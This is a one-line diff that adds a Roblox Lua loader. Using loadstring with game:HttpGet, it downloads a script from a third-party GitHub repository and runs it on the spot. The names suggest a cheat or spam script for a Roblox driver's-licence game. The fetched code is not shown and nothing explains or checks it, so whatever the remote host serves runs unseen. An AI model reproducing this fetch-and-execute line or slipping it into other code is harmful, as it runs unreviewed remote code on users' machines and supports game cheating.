@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/get-your-driver-s-license-spam4-387v3xb8gx139n.lua"))()
